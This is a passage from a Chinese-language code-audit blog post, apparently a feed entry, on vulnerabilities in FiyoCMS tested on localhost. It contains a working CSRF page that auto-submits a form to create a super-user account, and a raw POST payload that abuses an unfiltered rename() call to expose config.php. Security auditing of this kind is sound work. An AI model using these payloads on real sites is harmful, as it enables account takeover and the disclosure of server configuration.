text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://127.0.0.1/dapur/?app=user&amp;act=add</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=adad7183ca248a9be539f0a153ce72f8; bdshare_firstime=1551059496947</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">apply=Next&amp;id=&amp;z=&amp;user=test02&amp;z=&amp;x=&amp;password=test02&amp;kpassword=test02&amp;email=123%4012345.com&amp;level=1&amp;name=test02&amp;status=1&amp;bio=</span><br></pre></td></tr></table></figure><p>构造好的用于建立超级用户的网页代码如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">"csrf"</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1/dapur/?app=user&amp;act=add"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"apply"</span> <span class="attr">value</span>=<span class="string">"Next"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"id"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"z"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"user"</span> <span class="attr">value</span>=<span class="string">"test66"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"z"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"x"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"test66"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"kpassword"</span> <span class="attr">value</span>=<span class="string">"test66"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"email"</span> <span class="attr">value</span>=<span class="string">"123&amp;#x40;12345&amp;#x2e;com"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"level"</span> <span class="attr">value</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">"test66"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"status"</span> <span class="attr">value</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"bio"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.csrf.submit();</span></span><br><span class="line"><span class="undefined"> </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>用户访问<a href="https://127.0.0.1/demo.html，就会立即生成test66的超级用户" target="_blank" rel="noopener">https://127.0.0.1/demo.html，就会立即生成test66的超级用户</a></p><h3 id="任意文件修改漏洞"><a href="#任意文件修改漏洞" class="headerlink" title="任意文件修改漏洞"></a>任意文件修改漏洞</h3><h4 id="位置-5"><a href="#位置-5" class="headerlink" title="位置"></a>位置</h4><p>/dapur/apps/app_config/sys_config.php 第190-193行</p><h4 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$new_folder = $_POST[<span class="string">'folder_new'</span>];</span><br><span class="line">$old_folder = $_POST[<span class="string">'folder_old'</span>];</span><br><span class="line"><span class="keyword">if</span>($old_folder != $new_folder) &#123;</span><br><span class="line">$ok = @rename(<span class="string">"../$old_folder"</span>,<span class="string">"../$new_folder"</span>);</span><br></pre></td></tr></table></figure><p>对POST传递的参数folder_new和folder_old未进行过滤拼接至<strong>rename</strong>函数进行文件名修改操作</p><h4 id="复现-5"><a href="#复现-5" class="headerlink" title="复现"></a>复现</h4><p>Payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /dapur/?app=config HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 517</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://127.0.0.1/dapur/?app=config</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=adad7183ca248a9be539f0a153ce72f8; bdshare_firstime=1551059496947</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">config_save=Simpan&amp;site_name=fiyocms&amp;title=Fast%2C+Save+%26+Elegant%21&amp;url=localhost&amp;mail=your%40site.net&amp;folder_new=config.txt&amp;folder_old=config.php&amp;status=1&amp;meta_keys=keyword+1%2C+keyword+two%2C+3rd+key&amp;meta_desc=&amp;sef=1&amp;https=0&amp;www=1&amp;follow_link=1&amp;title_type=1&amp;title_divider=+-+&amp;sef_ext=.html&amp;name=fiyocms&amp;member_registration=1&amp;member_activation=2&amp;member_group=5&amp;file_allowed=swf+flv+avi+mpg+mpeg+qt+mov+wmv+asf+rm+rar+zip+exe+msi+iso&amp;disk_space=500&amp;file_size=5120&amp;media_theme=oxygen&amp;lang=id&amp;timezone=Asia%2FJakarta</span><br></pre></td></tr></table></figure><p>将网站根目录config.php文件修改成config.txt文件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/fiyocms/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>直接可以查看网站的配置信息</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>该CMS存在大多的问题都是由于未对用户提交的参数进行过滤处理，导致一系列的漏洞发生，本次审计漏洞难度较简单，网站结构相对于zzcms较为复杂，还需要多加实践增加审计的经验</p>]]></content>
    
    <summary type="html">
    
      代码审计
    
    </summary>
    
      <category term="代码审计" scheme="https://Foxgrin.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="https://Foxgrin.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
</feed>
